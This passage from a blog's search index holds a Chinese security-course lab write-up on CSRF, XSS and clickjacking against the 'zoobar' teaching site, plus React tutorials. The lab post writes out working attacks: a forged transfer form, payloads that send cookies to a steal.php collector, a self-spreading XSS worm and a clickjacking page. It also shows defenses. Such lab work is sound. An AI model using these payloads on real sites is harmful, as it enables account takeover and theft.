都变多了。 但这样有点不符合题意。 接着尝试闭合标签 观察 Home 页的 HTML 不难发现，profile 内容是直接放在 &lt;textarea&gt;&lt;/textarea&gt; 之间的。 那只要 profile 中写 &lt;/textarea&gt; 就能直接闭合 textarea，然后在后面就可以写自己需要的 html 代码了。 比如 1&lt;/textarea&gt;&lt;script&gt;alert(\\'123\\')&lt;/script&gt; save 之后： 但是 Users 页里 &lt;script&gt; 标签似乎被拦截了，查看他人 profile 时会看到去掉 &lt;script&gt; 标签的结果。 再考虑到修改 Home 只能骗自己，因此考虑修改 Users 页面。 Users 页的 profile 内容是放在 &lt;p&gt;&lt;/p&gt; 标签中的，因此修改 profile 为 123hello&lt;/p&gt;&lt;span style=&quot;position: absolute;top: 161px;display:block;padding-left:154px&quot;&gt;0&lt;/span&gt; 闭合 &lt;p&gt; 标签后在后面创建了一个 &lt;span&gt; 标签，设置它的 css 属性，让它正好显示在 zoobar 数值后面，如下图 页面比例调整也不会影响显示位置，效果还行。唯一缺点就是刚查看他人 profile 时 zoobars 会有个增长的过程的动画，这个就没办法了。","link":"/2021/12/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5-%E5%AE%9E%E9%AA%8C%E4%BA%8C/"},{"title":"信息安全实践 实验三","text":"实验内容为实现并防御 CSRF、XSS、点击劫持攻击。 知识点 token 的用法 服务器校验表单提交的 token 和 Session 中的 token 是否一致 即 token 不用存在数据库。服务器会 要注意的是，老师给的样例代码中，表单中的 token 不是提交时通过 js 代码从 Cookie 中获取的，而是 php 生成页面表单时就填进去的。 原理在于 csrf 仿造的表单没办法获取到 Cookie，也就不能在表单中附上 token，检验就不会通过。 ajax 模拟表单提交 如果想使用 xss 实现修改 profile 或者 zoobars 的话，要跟 csrf 一样构造表单，为了不让用户察觉还需要用 js 来构造，就很麻烦。但表单点击提交后本质上就是发送一个 post 请求 给后端，所以直接用 ajax 模拟这个 post 请求是一样的效果。 下面的代码就能模拟修改 profile 123456hi, there. &lt;script&gt;var a = new XMLHttpRequest(); a.open(&quot;post&quot;,&quot;http://localhost/index.php&quot;,true); a.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); a.send(&quot;profile_update=i love serena&amp;profile_submit=Save&quot;); &lt;/script&gt; 下面的代码能模拟转交 zoobars 12345&lt;script&gt;var a = new XMLHttpRequest(); a.open(&quot;post&quot;,&quot;http://localhost/transfer.php&quot;,true); a.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); a.send(&quot;zoobars=1&amp;recipient=test&amp;submisson=Send&quot;); &lt;/script&gt; cookie 的 http onlycookie 有 7 个属性，第七个是设置是否 http only。 http only 表示只允许 http 协议使用 cookie，不能使用 js 代码使用 cookie，一定程度上可以避免 xss 攻击。 实验步骤 CSRF 攻击 新建一个csrf.html，复制 transfer 页面的表单放进去 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang='zh'&gt;&lt;head&gt; &lt;meta charset='UTF-8'&gt; &lt;meta http-equiv='X-UA-Compatible' content='IE=edge'&gt; &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form method=POST name=transferform action=&quot;/transfer.php&quot;&gt; &lt;p&gt;Send &lt;input name=zoobars type=text value=&quot;1&quot; size=5&gt; zoobars&lt;/p&gt; &lt;p&gt;to &lt;input name=recipient type=text value=&quot;&quot;&gt;&lt;/p&gt; &lt;input type=submit name=submission value=&quot;Send&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 在自己的 profile 里放上这个网页的连接，诱使用户点开 1http://localhost/csrf.html 由于 users.php 禁止了 &lt;a&gt; 标签，所以就算写超链接也没用。除非修改users.php。不过本质上都一样，所以这里就不改了。 用户打开的网页如图所示 表格的效果与 transfer 页的一模一样，真正攻击时可以伪装一下，总之这里可以诱导用户点击 send，给攻击者发送 zoobar。当然，自动触发 send 也是可以的。 CSRF 防御 使用 token 来防御 csrf 攻击即可。具体操作看上面的 token 知识点部分。 要修改 transfer.php 为了便于开启关闭 csrf 防御，这里把修改前后的代码都全部粘贴出来，便于修改前后快速切换(全选再粘贴就行了) 修改前： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php require_once(&quot;includes/common.php&quot;); nav_start_outer(&quot;Transfer&quot;); nav_start_inner(); if($_POST['submission']) { $recipient = $_POST['recipient']; $zoobars = (int) $_POST['zoobars']; $sql = &quot;SELECT Zoobars FROM Person WHERE PersonID=$user-&gt;id&quot;; $rs = $db-&gt;executeQuery($sql); $rs = mysqli_fetch_array($rs); $sender_balance = $rs[&quot;Zoobars&quot;] - $zoobars; $sql = &quot;SELECT PersonID FROM Person WHERE Username='$recipient'&quot;; $rs = $db-&gt;executeQuery($sql); $rs = mysqli_fetch_array($rs); $recipient_exists = $rs[&quot;PersonID&quot;]; if($zoobars &gt; 0 &amp;&amp; $sender_balance &gt;= 0 &amp;&amp; $recipient_exists) { $sql = &quot;UPDATE Person SET Zoobars = $sender_balance &quot; . &quot;WHERE PersonID=$user-&gt;id&quot;; $db-&gt;executeQuery($sql); $sql = &quot;SELECT Zoobars FROM Person WHERE Username='$recipient'&quot;; $rs = $db-&gt;executeQuery($sql); $rs = mysqli_fetch_array($rs); $recipient_balance = $rs[&quot;Zoobars&quot;] + $zoobars; $sql = &quot;UPDATE Person SET Zoobars = $recipient_balance &quot; . &quot;WHERE Username='$recipient'&quot;; $db-&gt;executeQuery($sql); $result = &quot;Sent $zoobars zoobars&quot;; } else $result = &quot;Transfer to $recipient failed.&quot;; }?&gt;&lt;p&gt;&lt;b&gt;Balance:&lt;/b&gt;&lt;span id=&quot;myZoobars&quot;&gt; &lt;?php $sql = &quot;SELECT Zoobars FROM Person WHERE PersonID=$user-&gt;id&quot;; $rs = $db-&gt;executeQuery($sql); $rs = mysqli_fetch_array($rs); $balance = $rs[&quot;Zoobars&quot;]; echo $balance &gt; 0 ? $balance : 0;?&gt; &lt;/span&gt; zoobars&lt;/p&gt;&lt;form method=POST name=transferform action=&quot;&lt;?php echo $_SERVER['PHP_SELF']?&gt;&quot;&gt;&lt;p&gt;Send &lt;input name=zoobars type=text value=&quot;&lt;?php echo $_POST['zoobars']; ?&gt;&quot; size=5&gt; zoobars&lt;/p&gt;&lt;p&gt;to &lt;input name=recipient type=text value=&quot;&lt;?php echo $_POST['recipient']; ?&gt;&quot;&gt;&lt;/p&gt;&lt;input type=submit name=submission value=&quot;Send&quot;&gt;&lt;/form&gt;&lt;span class=warning&gt;&lt;?php echo &quot;$result&quot;; ?&gt;&lt;/span&gt;&lt;?php nav_end_inner();?&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;zoobars.js.php&quot;&gt;&lt;/script&gt;&lt;?php nav_end_outer(); ?&gt; 修改后： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?php session_start();?&gt;&lt;?php require_once(&quot;includes/common.php&quot;); nav_start_outer(&quot;Transfer&quot;); nav_start_inner(); if($_POST['submission'] &amp;&amp; $_POST['token'] == $_SESSION['csrf']) { $recipient = $_POST['recipient']; $zoobars = (int) $_POST['zoobars']; $sql = &quot;SELECT Zoobars FROM Person WHERE PersonID=$user-&gt;id&quot;; $rs = $db-&gt;executeQuery($sql); $rs = mysqli_fetch_array($rs); $sender_balance = $rs[&quot;Zoobars&quot;] - $zoobars; $sql = &quot;SELECT PersonID FROM Person WHERE Username='$recipient'&quot;; $rs = $db-&gt;executeQuery($sql); $rs = mysqli_fetch_array($rs); $recipient_exists = $rs[&quot;PersonID&quot;]; if($zoobars &gt; 0 &amp;&amp; $sender_balance &gt;= 0 &amp;&amp; $recipient_exists) { $sql = &quot;UPDATE Person SET Zoobars = $sender_balance &quot; . &quot;WHERE PersonID=$user-&gt;id&quot;; $db-&gt;executeQuery($sql); $sql = &quot;SELECT Zoobars FROM Person WHERE Username='$recipient'&quot;; $rs = $db-&gt;executeQuery($sql); $rs = mysqli_fetch_array($rs); $recipient_balance = $rs[&quot;Zoobars&quot;] + $zoobars; $sql = &quot;UPDATE Person SET Zoobars = $recipient_balance &quot; . &quot;WHERE Username='$recipient'&quot;; $db-&gt;executeQuery($sql); $result = &quot;Sent $zoobars zoobars&quot;; } else $result = &quot;Transfer to $recipient failed.&quot;; }?&gt;&lt;p&gt;&lt;b&gt;Balance:&lt;/b&gt;&lt;span id=&quot;myZoobars&quot;&gt; &lt;?php $sql = &quot;SELECT Zoobars FROM Person WHERE PersonID=$user-&gt;id&quot;; $rs = $db-&gt;executeQuery($sql); $rs = mysqli_fetch_array($rs); $balance = $rs[&quot;Zoobars&quot;]; echo $balance &gt; 0 ? $balance : 0;?&gt; &lt;/span&gt; zoobars&lt;/p&gt;&lt;?php $_SESSION['csrf'] = md5(uniqid(mt_rand(), true));?&gt;&lt;form method=POST name=transferform action=&quot;&lt;?php echo $_SERVER['PHP_SELF']?&gt;&quot;&gt;&lt;p&gt;Send &lt;input name=zoobars type=text value=&quot;&lt;?php echo $_POST['zoobars']; ?&gt;&quot; size=5&gt; zoobars&lt;/p&gt;&lt;p&gt;to &lt;input name=recipient type=text value=&quot;&lt;?php echo $_POST['recipient']; ?&gt;&quot;&gt;&lt;/p&gt;&lt;input type=hidden name=token value=&quot;&lt;?php echo $_SESSION['csrf']?&gt;&quot;/&gt;&lt;input type=submit name=submission value=&quot;Send&quot;&gt;&lt;/form&gt;&lt;span class=warning&gt;&lt;?php echo &quot;$result&quot;; ?&gt;&lt;/span&gt;&lt;?php nav_end_inner();?&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;zoobars.js.php&quot;&gt;&lt;/script&gt;&lt;?php nav_end_outer(); ?&gt; 具体修改部分： 在开头加入下面的内容 123&lt;?php session_start();?&gt; 修改第一个 if 语句（检验 token） 1if($_POST['submission'] &amp;&amp; $_POST['token'] == $_SESSION['csrf']) 在 45-47 行加入下面内容（生成 token） 123&lt;?php $_SESSION['csrf'] = md5(uniqid(mt_rand(), true));?&gt; 在 form 中添加下面的内容（即表单中附带上 token） 1&lt;input type=hidden name=token value=&quot;&lt;?php echo $_SESSION['csrf']?&gt;&quot;/&gt; XSS 攻击 主要出现在网页会直接显示用户输入的情况。 比如 zoobar 这个网站的 profile，会将 用户输入的内容 直接显示在他人的网页中。这样假如攻击者在 profile 中放一些攻击的脚本，网页也会自动执行。 cookie 窃取 有几种方法。 假设攻击者自己的网站是steal.php。 首先可以直接放一个 &lt;img&gt; 标签在 profile 中，再通过 js 代码获取到 cookie，拼接出攻击者网站的请求连接，再设为 &lt;img&gt; 的herf属性，当他人查看攻击者的 profile 时，网页就会自动发送请求给攻击者网站。 12345&lt;img id='sendAuto'/&gt;&lt;script&gt;var img = document.getElementById(&quot;sendAuto&quot;);img.src=&quot;http://www.zoobar.com/steal.php?cookie=&quot;+document.cookie;&lt;/script&gt; 也可以使用 &lt;a&gt; 标签诱使用户自己点击，效果是一样的。 12345&lt;a id=&quot;id&quot;&gt;click me&lt;/a&gt;&lt;script&gt;var aLink = document.getElementById(&quot;id&quot;);aLink.href=&quot;http://www.zoobar.com/steal.php?cookie=&quot;+document.cookie;&lt;/script&gt; 还可以使用 ajax 请求来实现攻击。 123456&lt;script&gt;var pay=new XMLHttpRequest();url = &quot;http://www.zoobar.com/steal.php?cookie=&quot;+document.cookie;pay.open(&quot;get&quot;,url,false);pay.send(&quot;&quot;);&lt;/script&gt; 用 ajax 要注意，默认是禁止跨域 ajax 请求的，所以攻击者网站必须允许跨域。 老师给的服务器端代码（ steal.php ）如下 1234567Steal.php&lt;?phpheader(&quot;Access-Control-Allow-Origin:*&quot;); $myfile = fopen(&quot;test.txt&quot;,&quot;w&quot;) or die(&quot;unable to open&quot;);fwrite($myfile,$_GET[&quot;cookie&quot;]);fclose($myfile);?&gt; 此外，为了能让 steal.php 能够修改 test.txt，需要赋予 apache 用户（也就是 www-data）修改 test.txt 的权限。 1sudo chown www-data /var/www/myzoo/test.txt 使用 ll 命令即可查看权限。 其他用户查看攻击者的 profile 后，steal.php 就能获取到 cookie 并存入 test.txt XSS 蠕虫 理论上就是通过攻击修改其他用户的 profile，将他人的 profile 也修改为攻击代码，当第三者查看被攻击者的 profile 时，又会被攻击，循环往复。 这里只需要结合上述的 ajax 窃取 cookie 和 ajax 修改他人 profile 的代码即可。 重点在于，要想实现蠕虫效果，即能够不断复制，必须要能够将被攻击的 profile 修改成和攻击代码本身一模一样。但是修改 profile 的语句也包含在攻击代码内，不可能手动将 profile_update= 写成和攻击代码一样，因为这样这次写的攻击代码中又包含修改 profile 的部分，就无限循环了。 解决办法就是，profile 部分，让程序自动获取攻击代码本身。实现方法就是在 &lt;script&gt; 标签外侧再套一层 &lt;span&gt; 标签，并指定 id，这样就能够通过下面第 11 行的语句拼接出一个和攻击者 profile 一模一样的 str，并将被攻击者的 profile 修改成这个，就能实现蠕虫效果了。 123456789101112131415&lt;span id=&quot;worm&quot;&gt; &lt;script&gt; var pay=new XMLHttpRequest(); url = &quot;http://localhost/steal.php?cookie=&quot;+document.cookie; pay.open(&quot;get&quot;,url,false); pay.send(&quot;&quot;); var a = new XMLHttpRequest(); a.open(&quot;post&quot;,&quot;http://localhost/index.php&quot;,true); a.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); var str=&quot;&lt;span id=worm&gt;&quot;+document.getElementById(&quot;worm&quot;).innerHTML+&quot;&lt;/span&gt;&quot;; str = encodeURIComponent(str); a.send(&quot;profile_update=&quot;+str+&quot;&amp;profile_submit=Save&quot;); &lt;/script&gt;&lt;/span&gt; 需要注意，profile 里不能写单引号，否则会造成 sql 错误； 此外，document.getElementById(&quot;worm&quot;).innerHTML的字符串会包含引号之类的字符，导致拼接字符串时出问题，因此需要使用 encodeURIComponent(str) 处理一下。 XSS 防御XSS 防御的基本思路是输入过滤，输出转义。 输入过滤，很简单，服务器设置白名单或者黑名单，禁止掉可能会被用作攻击的标签即可。zoobar 网站就是在 user.php 中实现了这一功能。 输出转义 ，主要是因为输入的恶意代码，如果保存在网站的数据库中，最终都是有一个输出的过程然后才能获得执行。那么就在从数据库取出，并展示在网页之前，对所有的内容进行转义。PHP 中htmlentities() 函数把字符转换为 HTML 实体。HTML 实体（character entities）的目的是正确地显示预留字符，譬如如果想要在网页上输出&lt;br&gt;，如果直接在 HTML 中写&lt;br&gt;，浏览器会自动将它当做代码，而不是字符串，此时就需要，将 &lt; 和 &gt; 转换为实体，也即 &lt; 或 &amp;#60。也即，通过 htmlentities，所有的攻击代码，不管怎么构造的，都会被变成普通的字符，而不会造成攻击效果。（最保险的方法） 点击劫持攻击 在 csrf 攻击被防御后，还可以适合用点击劫持攻击。 即使用 iframe 嵌套子网页实现，再控制 iframe 的透明度以及 z-index 属性，将其放在攻击者伪装的按钮以及输入框之上，诱使用户点击。 新建 clickjack.html，代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;header&gt;&lt;title&gt;click jack&lt;/title&gt;&lt;style&gt;#zoobarpage {width:400px;height:600px;opacity:0;z-index:9;position:absolute;}button {position: absolute;top: 425px;left: 148px;width: 44px;}#input1{position:absolute;width:40px;top:337px;left:124px;}#input2{position:absolute;width:95px;top:390px;left:70px;}&lt;/style&gt;&lt;/header&gt;&lt;body&gt;&lt;iframe id=&quot;zoobarpage&quot; onload=&quot;failcsrf()&quot; src=&quot;http://localhost/transfer.php&quot;&gt;&lt;/iframe&gt;&lt;input type=&quot;text&quot; id=&quot;input1&quot;&gt;&lt;/input&gt;&lt;input type=&quot;text&quot; id=&quot;input2&quot;&gt;&lt;/input&gt;&lt;button&gt;click&lt;/button&gt;&lt;/body&gt; 如果不伪装一下的话，效果如下： 调整子网页的透明度，可以看到其实是这样 当然这样也有问题，比如输入的内容用户是看不到的，会让用户起疑 点击劫持防御 只需要修改 transfer.php，添加如下代码即可（可以添加在 &lt;p&gt;&lt;b&gt;Balance:&lt;/b&gt; 之前） 1234&lt;script&gt;if (top != self) top.location.href = location.href&lt;/script&gt; 即，如果 transfer 页面不是最顶层页面，就直接跳转到真正的 transfer 页面。直接禁止了将 transfer 页面作为子网页。 备忘录 账户用途chen/test：用于第二次实验 cookiebyajax：用于实现 xss 攻击，具体就是使用 ajax 窃取 tooken xssworm：用于实现 xss 蠕虫攻击 wormtest/wormtest2：用于测试和 xss 蠕虫 文件用途csrf.html：顾名思义，用于实现 csrf 攻击 steal.php：用于获取窃取到的 token test.txt：用于存放 steal.php 收到的 token clickjack.html：顾名思义，用于实现点击劫持攻击","link":"/2022/01/02/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5-%E5%AE%9E%E9%AA%8C%E4%B8%89/"},{"title":"React 函数式组件的简单使用及心得","text":"使用 React 的函数式组件以及 Hooks 实现了一个简单的 todo list。 效果如下图： 项目地址 就写一些重点吧。 React 脚手架的使用方式变了 原先是使用 npm i -g create-react-app 安装 create-react-app，再使用 create-react-app app-name 新建项目。 现在不行了，这种方式已经被禁止了。现在是直接用下面的命令新建项目。 1npx create-react-app app-name 官方文档 先搭好界面，再拆分成组件 也就是先只是用 html/css 搭建基本的 UI 界面，然后再根据功能划分拆分成不同的组件。这样的好处是界面的逻辑更加清晰。 当然边创建组件边实现每个组件的 UI，最后拼到一起也可以，我就是这么做的。但是这样思路不够清晰，尤其是 css 样式部分，就很混乱。不建议这么干。 存储数据到本地可以使用 localStorage存数据 12var str = JSON.stringify(data) // 转换为 json 格式字符串localStorage.setItem('todoListData', str) // 键值对的形式存储 取数据 1234let s = localStorage.getItem('todoListData') // 获取到数据if (s !== null) { setData(JSON.parse(s)) // 将字符串解析后赋给 data（使用 useState 返回的方法）} 可以在修改 state 后就更新本地数据 将保存数据到本地的操作放到 useEffect() 中 123456789101112131415161718192021var saveData = () =&gt; { localStorage.removeItem('todoListData') var str = JSON.stringify(data) console.log(str); localStorage.setItem('todoListData', str)}useEffect(() =&gt; { // 初次打开页面时从 localStorage 中读取数据 let s = localStorage.getItem('todoListData') if (s !== null) { console.log(JSON.parse(s)); setData(JSON.parse(s)) }}, [])useEffect(() =&gt; { //data 更新后自动存入 localStorage saveData()}, [data]) 要注意，千万不能在每次调用 setData() 后手动调用一遍 saveData()，因为setData() 可能是异步操作，所以会先执行 saveData()，后修改 data，导致saveData() 保存的其实是修改前的数据。","link":"/2022/01/19/React%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BB%84%E4%BB%B6%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%BF%83%E5%BE%97/"},{"title":"react-router v6 的基本使用","text":"React Router v6 大概是去年才更新的，和以往的版本变化挺大的，也实现了对 hooks 的支持。 安装 首先创建一个 react app 1npx create-react-app react-router-v6-test 进入刚创建的文件夹（千万不要忘！） 1cd react-router-v6-test 获取 react-router v6 1npm install react-router-dom@6 基本使用 在最外侧包裹一个 &lt;BrowserRouter&gt; 标签 修改 index.js 12345678910111213import * as React from &quot;react&quot;;import * as ReactDOM from &quot;react-dom&quot;;import { BrowserRouter } from &quot;react-router-dom&quot;;import &quot;./index.css&quot;;import App from &quot;./App&quot;;import * as serviceWorker from &quot;./serviceWorker&quot;;ReactDOM.render( &lt;BrowserRouter&gt; &lt;App /&gt; &lt;/BrowserRouter&gt;, document.getElementById(&quot;root&quot;)); 添加路由 RouteRoute 根据 path 参数判断 url 是否符合要求，符合的话则替换为 element 指明的组件。 一般会由一个 &lt;Routes&gt; 包裹多个 &lt;Route&gt;，在这些&lt;Route&gt; 中，url 最多只会满足其中一个的 path 条件，因此同时最多只能显示一个 Route 对应的组件。 如果需要一个默认的路由，可以写一个&lt;Route path='*' element={...} /&gt;。 需要注意的是，默认会匹配最精准的一个 url，比如同时出现 path='/home' 和path='*'的两个 Route，前者肯定是更加精准的。 官方示例代码: 123456789101112131415import * as React from &quot;react&quot;;import { Routes, Route, Link } from &quot;react-router-dom&quot;;import &quot;./App.css&quot;;function App() { return ( &lt;div className=&quot;App&quot;&gt; &lt;h1&gt;Welcome to React Router!&lt;/h1&gt; &lt;Routes&gt; &lt;Route path=&quot;/&quot; element={&lt;Home /&gt;} /&gt; &lt;Route path=&quot;about&quot; element={&lt;About /&gt;} /&gt; &lt;/Routes&gt; &lt;/div&gt; );} 为了能修改 url，以便符合 Route 的 path 参数，有两种方式，一个是使用&lt;Link&gt;，一个是使用编程式导航。 &lt;Link&gt;标签 可以理解为超链接 &lt;a&gt; 的一个变种，实际上最后也的确是转换为 &lt;a&gt; 标签的。 格式为 1&lt;Link to=&quot;/about&quot;&gt;About&lt;/Link&gt; 只有一个参数to，指明如何修改 url。 要注意的是，这里的 to，和上面的path，如果用/ 开头，则表示绝对路径，会将整个 url 替换掉；如果用 ./ 或则干脆直接写内容，则是相对路径，会将内容拼接到当前 url 后面。 &lt;NavLink&gt;标签 &lt;Link&gt; 标签的一个变种，可以提供一个 isActive 属性，可用于实现高亮当前 Link 的效果。 编程式导航 这里要用到一个 hook 了。 简单来说，就三步: 首先引入 hook 函数 1import {useNavigate} from 'react-router-dom' 接着使用 hook 获取到 navigate 函数 1let navigate = useNavigate(); 使用 navigate() 来修改 url 1navigate(&quot;/SomeWhere&quot;); 作为参数的路径也要注意开头的/。 多级路由的实现 多级路由的就是在保证父路由对应组件显示的情况下，显示子路由对应的组件。 嵌套路由 这个应该是 v6 版本新增的用法。 官方示例： 123456789101112131415161718192021222324252627282930import { Routes, Route, Outlet } from &quot;react-router-dom&quot;;function App() { return ( &lt;Routes&gt; &lt;Route path=&quot;invoices&quot; element={&lt;Invoices /&gt;}&gt; {/* 父路由 */} &lt;Route path=&quot;:invoiceId&quot; element={&lt;Invoice /&gt;} /&gt; {/* 子路由 */} &lt;Route path=&quot;sent&quot; element={&lt;SentInvoices /&gt;} /&gt; &lt;/Route&gt; &lt;/Routes&gt; );}function Invoices() { return ( &lt;div&gt; &lt;h1&gt;Invoices&lt;/h1&gt; &lt;Outlet /&gt; {/* 子路由对应的组件会显示在这里 */} &lt;/div&gt; );}function Invoice() { let { invoiceId } = useParams(); return &lt;h1&gt;Invoice {invoiceId}&lt;/h1&gt;;}function SentInvoices() { return &lt;h1&gt;Sent Invoices&lt;/h1&gt;;} 嵌套路由的 index 路由12345678&lt;Routes&gt; &lt;Route path=&quot;invoices&quot; element={&lt;Invoices /&gt;}&gt; {/* 父路由 */} &lt;Route path=&quot;:invoiceId&quot; element={&lt;Invoice /&gt;} /&gt; {/* 子路由 */} &lt;Route path=&quot;sent&quot; element={&lt;SentInvoices /&gt;} /&gt; {/* 不写 path，写 index 就是 index 路由，也就是默认子路由 */} &lt;Route index element={&lt;div&gt;this is index route&lt;/div&gt;} &lt;/Route&gt;&lt;/Routes&gt; 不使用嵌套路由 拿官方的示例改一改： 12345678910111213141516171819202122232425262728293031import { Routes, Route, Outlet } from &quot;react-router-dom&quot;;function App() { return ( &lt;Routes&gt; {/* 需要在父路由的 path 最后添加 '*'，因为默认是不会匹配比它长的 url 的，而多级路由必须保证父路由被匹配到 */} &lt;Route path=&quot;invoices/*&quot; element={&lt;Invoices /&gt;} /&gt; &lt;/Routes&gt; );}function Invoices() { return ( &lt;div&gt; &lt;h1&gt;Invoices&lt;/h1&gt; &lt;Routes&gt; &lt;Route path=&quot;:invoiceId&quot; element={&lt;Invoice /&gt;} /&gt; {/* 子路由 */} &lt;Route path=&quot;sent&quot; element={&lt;SentInvoices /&gt;} /&gt; &lt;/Routes&gt; &lt;/div&gt; );}function Invoice() { let { invoiceId } = useParams(); return &lt;h1&gt;Invoice {invoiceId}&lt;/h1&gt;;}function SentInvoices() { return &lt;h1&gt;Sent Invoices&lt;/h1&gt;;} 重点就是父路由的 path 最后要添加通配符*。 获取 url 中的参数 也是使用 hooks 1234567891011121314151617import { Routes, Route, useParams } from &quot;react-router-dom&quot;;function App() { return ( &lt;Routes&gt; &lt;Route path=&quot;invoices/:invoiceId&quot; element={&lt;Invoice /&gt;} /&gt; &lt;/Routes&gt; );}function Invoice() { let params = useParams(); return &lt;h1&gt;Invoice {params.invoiceId}&lt;/h1&gt;;} :后面跟的就是参数 params，可以用 useParams() 获取到。 也可以使用解构赋值 12let {invoiceId} = useParams();return &lt;h1&gt;Invoice {invoiceId}&lt;/h1&gt;; 跳转至默认地址 有时候需要遇到错误的 url 就跳转到一个默认的 url，实现如下 1234567import { Routes, Route, Navigate } from 'react-router-dom';&lt;Routes&gt; ... {/* 当 url 为任意不匹配 url 时，修改 url 为 'home' */} &lt;Route path=&quot;*&quot; element={&lt;Navigate to='home' /&gt;} /&gt; &lt;/Routes&gt; 这里的&lt;Navigate to='home' /&gt;，看起来也是一个 react-router 自带的标签吧，应该是用于实现强制跳转的。 路径的规则 要注意的是，所有的to、path，如果用 / 开头，则表示绝对路径，会将整个 url 替换掉；如果用./ 或则干脆直接写内容，则是相对路径，会将内容拼接到当前 url 后面。","link":"/2022/01/24/react-router-v6-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"},{"title":"render-props 和高阶组件","text":"React 中实现组件复用主要由两种方式：render-props 和高阶组件。 所谓组件复用，其实就是复用组件的状态 state。比如监听鼠标坐标的功能，不需要每个组件监听鼠标移动并修改各自的 state，完全可以提取出来。 本文基于类式组件简单介绍一下原理。函数式组件理论上也一样。 render-props我个人的理解，render-props 本质上其实就是一种回调函数。 基本的用法如下 123456789101112131415161718// 设计class Mouse extends React.Component { state={ x:0, y:0 } // ... // 监听鼠标移动并修改 state render() { return this.props.render(this.state) // 这一行就是核心 }}// 调用&lt;Mouse render={(mouse)=&gt;{/* ... */}}/&gt; 调用者传递一个叫做 render 的 props 给 render-props 类型的组件，render的内容其实就是一个回调函数。Mouse 组件中的 render() 函数中再调用这个组件，并将自己的 state 作为参数，这样就做到了 state 的复用。 本质上和回调函数一模一样，只是基于 react 的特性修改了一下语法。 当然，用于传递回调函数的 props 叫什么名都可以，这里用 render 只是为了照应 render-props 的名字。 一般推荐使用 children，方便一点，用法如下 12345678910111213141516171819202122// 设计class Mouse extends React.Component { state={ x:0, y:0 } // ... // 监听鼠标移动并修改 state render() { return this.props.childern(this.state) // 这一行的 render 改为 children }}// 调用&lt;Mouse&gt;{ (mouse)=&gt; &lt;p&gt; 鼠标当前位置： {mouse.x}, {mouse.y}&lt;/p&gt; //children 这个 props 直接写为子元素就行}&lt;/Mouse&gt; 由于最后的返回值就是回调函数的返回值，因此如果需要最终渲染出内容，需要写在回调函数的返回值中。 高阶组件 高阶组件要稍微复杂一点。 高阶组件使用一个组件作为参数，返回值也是组件的函数。具体如下： 1234567891011121314151617181920212223242526272829// 设计 function withMouse(wrappedComponent){ class Mouse extends React.Component{ state={ x:0, y:0 } // ... // 监听鼠标移动并修改 state render() { // 将 Mouse 的 state 作为 props 传给 wrappedComponent，并将其作为 render() 的返回值 return &lt;wrappedComponent {...this.state}/&gt; } } return Mouse }// 调用const Portion=props=&gt;(&lt;p&gt; 当前鼠标位置: {props.x} {props.y}&lt;/p&gt;)// 这里新的到的 MousePostion 组件其实本质上就是 Mouse 组件，只是 Mouse 组件最后还是会返回 Position 组件，因此看起来和 Position 组件差不多const MousePosition=withMouse(Position) // 渲染&lt;MousePosition/&gt; 需要注意的是，在设计被包裹的组件时，必须要以被包裹为前提设计，即在内部必须要使用到上述的 x、y 这类高阶组件传进去的 props，否则高阶组件就没有意义了。","link":"/2022/02/07/Render-Props%E5%92%8C%E9%AB%98%E9%98%B6%E7%BB%84%E4%BB%B6/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"ES6","slug":"ES6","link":"/tags/ES6/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"React","slug":"React","link":"/tags/React/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"正则表达式","slug":"正则表达式","link":"/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"npm","slug":"npm","link":"/tags/npm/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"信息安全","slug":"信息安全","link":"/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"},{"name":"课程实验","slug":"课程实验","link":"/tags/%E8%AF%BE%E7%A8%8B%E5%AE%9E%E9%AA%8C/"},{"name":"OpenSSL","slug":"OpenSSL","link":"/tags/OpenSSL/"},{"name":"Redux","slug":"Redux","link":"/tags/Redux/"},{"name":"React-Redux","slug":"React-Redux","link":"/tags/React-Redux/"},{"name":"WSL2","slug":"WSL2","link":"/tags/WSL2/"},{"name":"Ubuntu","slug":"Ubuntu","link":"/tags/Ubuntu/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"Mysql","slug":"Mysql","link":"/tags/Mysql/"},{"name":"CSS","slug":"CSS","link":"/tags/CSS/"},{"name":"Web安全","slug":"Web安全","link":"/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"Hooks","slug":"Hooks","link":"/tags/Hooks/"},{"name":"React Router","slug":"React-Router","link":"/tags/React-Router/"}],"categories":[{"name":"note","slug":"note","link":"/categories/note/"},{"name":"学习","slug":"note/学习","link":"/categories/note/%E5%AD%A6%E4%B9%A0/"},{"name":"实验","slug":"note/实验","link":"/categories/note/%E5%AE%9E%E9%AA%8C/"}]}